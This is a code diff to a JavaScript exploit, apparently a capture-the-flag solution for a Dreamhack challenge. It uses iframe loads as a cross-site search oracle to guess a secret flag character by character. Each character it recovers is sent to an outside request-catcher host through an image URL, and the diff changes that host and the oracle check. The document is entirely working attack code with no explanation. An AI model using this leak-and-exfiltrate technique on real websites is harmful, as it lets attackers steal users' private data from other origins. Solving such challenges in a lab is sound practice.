@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.querySelector('.sentence-list'))
+                if (iframe.contentDocument.querySelector('.sentence-list'))
                     return resolve();
                 else
                     return reject();
@@ -29,8 +29,8 @@
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://xohgszi.request.dreamhack.games/${secret}`;
+                    secret = secret + c;
+                    img.src = `https://qkctnvm.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
